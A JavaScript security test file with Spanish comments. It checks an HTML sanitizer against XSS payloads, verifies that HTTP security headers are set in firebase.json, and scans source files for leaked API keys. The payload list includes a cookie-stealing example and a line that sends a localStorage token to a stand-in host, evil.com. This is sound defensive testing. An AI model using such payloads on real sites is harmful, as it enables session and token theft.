/**
 * Capa 4: Pruebas de Seguridad Exhaustiva (AiAppFactory Standard)
 * Verifica neutralización en todos los sinks del DOM, cabeceras HTTP en firebase.json
 * y escaneo de secretos para cero exposición de credenciales.
 */

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { Sanitizer } from '../src/utils/sanitizer.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const projectRoot = path.resolve(__dirname, '..');

export async function runSecurityTests(harness) {
  // --- Test 43 a 46: Neutralización XSS en Sinks del DOM ---
  const xssPayloads = [
    '<img src=x onerror="alert(1)">',
    '<svg onload="alert(document.cookie)">',
    '"><script>window.location="http://evil.com"</script>',
    'javascript:void(fetch("http://evil.com/steal?token="+localStorage.getItem("token")))'
  ];

  for (const payload of xssPayloads) {
    const sanitized = Sanitizer.escapeHTML(payload);
    harness.assert(!sanitized.includes('<img') && !sanitized.includes('<svg') && !sanitized.includes('<script'), `Sanitizer neutraliza payload: ${payload.substring(0, 20)}...`);
  }

  // --- Test 47 a 49: Verificación de Cabeceras HTTP y CSP en firebase.json ---
  const fbPath = path.join(projectRoot, 'firebase.json');
  harness.assert(fs.existsSync(fbPath), 'firebase.json existe en el proyecto');

  const fbConfig = JSON.parse(fs.readFileSync(fbPath, 'utf-8'));
  const headers = fbConfig.hosting?.headers?.[0]?.headers || [];

  const cspHeader = headers.find(h => h.key === 'Content-Security-Policy');
  harness.assert(cspHeader !== undefined, 'Cabecera Content-Security-Policy declarada');
  harness.assert(!cspHeader.value.includes("'unsafe-eval'"), 'CSP prohíbe terminantemente unsafe-eval');
  harness.assert(!cspHeader.value.includes('script-src *'), 'CSP prohíbe comodín * en scripts');

  const xfo = headers.find(h => h.key === 'X-Frame-Options');
  harness.assert(xfo && xfo.value === 'DENY', 'Cabecera X-Frame-Options configurada en DENY');

  const nosniff = headers.find(h => h.key === 'X-Content-Type-Options');
  harness.assert(nosniff && nosniff.value === 'nosniff', 'Cabecera X-Content-Type-Options configurada en nosniff');

  const hsts = headers.find(h => h.key === 'Strict-Transport-Security');
  harness.assert(hsts && hsts.value.includes('max-age=31536000'), 'Cabecera HSTS activa por 1 año');

  // --- Test 50 y 51: Escaneo de Secretos e Inyección de Archivos ---
  const filesToScan = [
    path.join(projectRoot, 'package.json'),
    path.join(projectRoot, 'src/main.js'),
    path.join(projectRoot, 'src/state/store.js')
  ];

  let foundSecret = false;
  const secretPatterns = [
    /AIza[0-9A-Za-z-_]{35}/,
    /sk-[a-zA-Z0-9]{32,}/,
    /ghp_[a-zA-Z0-9]{36}/,
    /-----BEGIN PRIVATE KEY-----/
  ];

  for (const file of filesToScan) {
    if (fs.existsSync(file)) {
      const content = fs.readFileSync(file, 'utf-8');
      for (const pattern of secretPatterns) {
        if (pattern.test(content)) {
          foundSecret = true;
          break;
        }
      }
    }
  }

  harness.assert(!foundSecret, 'Escáner de Secretos: Cero claves privadas ni tokens expuestos en código');
}
